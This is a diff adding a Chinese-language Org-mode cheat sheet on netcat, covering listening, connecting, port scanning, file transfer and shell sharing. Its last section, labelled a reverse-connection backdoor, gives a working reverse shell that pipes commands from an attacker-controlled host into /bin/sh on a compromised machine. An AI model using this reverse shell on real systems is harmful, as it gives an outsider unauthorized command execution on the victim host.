@@ -1,0 +1,114 @@
+#+TITLE:     Netcat
+#+AUTHOR:    Hao Ruan
+#+EMAIL:     haoru@cisco.com
+#+LANGUAGE:  en
+#+LINK_HOME: http://www.github.com/ruanhao
+#+OPTIONS: h:6 html-postamble:nil html-preamble:t tex:t f:t ^:nil
+#+HTML_DOCTYPE: <!DOCTYPE html>
+#+HTML_HEAD: <link href="http://fonts.googleapis.com/css?family=Roboto+Slab:400,700|Inconsolata:400,700" rel="stylesheet" type="text/css" />
+#+HTML_HEAD: <link href="../org-html-themes/css/style.css" rel="stylesheet" type="text/css" />
+#+HTML: <div class="outline-2" id="meta">
+| Author   | {{{author}}} ({{{email}}})    |
+| Date     | {{{time(%Y-%m-%d %H:%M:%S)}}} |
+#+HTML: </div>
+#+TOC: headlines 3
+#+STARTUP:   showall
+
+
+* 基本用法
+
+** 服务器端
+
+#+BEGIN_SRC sh
+  nc -l <port>
+#+END_SRC
+
+
+** 客户端
+
+#+BEGIN_SRC sh
+  nc <ip> <port>
+#+END_SRC
+
+
+* 用法示例
+
+** 检测端口
+
+#+BEGIN_SRC sh
+  nc -w 1 -z <ip> 20-30
+#+END_SRC
+
+** 设置连接超时
+
+#+BEGIN_SRC sh
+  nc -w 5 <ip> <port>
+#+END_SRC
+
+** 指定源 IP
+
+#+BEGIN_SRC sh
+  ## -s 指定 src ip
+  nc -s 10.1.2.3 <ip> <port>
+#+END_SRC
+
+** 使用 Unix Domain Socket
+
+*** 服务器端
+
+#+BEGIN_SRC sh
+   nc -lU /var/tmp/dsocket
+#+END_SRC
+
+*** 客户端
+
+#+BEGIN_SRC sh
+    nc -U /var/tmp/dsocket
+#+END_SRC
+
+** 传输文件
+
+#+BEGIN_SRC sh
+  nc -v -l 8080 < file.txt       ## 服务器端
+  nc <ip>  8080 > save_file.txt  ## 客户端
+
+  nc -v -l 8080 > file.txt       ## 服务器端
+  nc <ip>  8080 < save_file.txt  ## 客户端
+#+END_SRC
+
+** 共享屏幕
+
+*** 一对多
+
+#+BEGIN_SRC sh
+    script -qf | tee >(nc -kl 5000) >(nc -kl 5001) >(nc -kl 5002)
+    ## run 'nc yourip 5000', 'nc yourip 5001' or 'nc yourip 5002' elsewhere
+    ## will produce an exact same mirror of your shell.
+    ## This is handy when you want to show someone else some amazing stuff
+    ## in your shell without giving them control over it.
+#+END_SRC
+
+*** 一对一
+
+#+BEGIN_SRC sh
+    mkfifo foo; script -f foo ## master
+    cat foo ## slaver
+#+END_SRC
+
+** 反向连接后门
+
+在黑客机 2345 端口上输入命令，在 2346 端口查看结果
+
+*** 黑客机输入命令
+
+#+BEGIN_SRC sh
+  ## hacker
+  nc -l 2345
+  nc -l 2346
+#+END_SRC
+
+*** 肉机输入命令
+
+#+BEGIN_SRC sh
+  nc <hacker-ip> 2345 | /bin/sh | nc <hacker-ip> 2346
+#+END_SRC
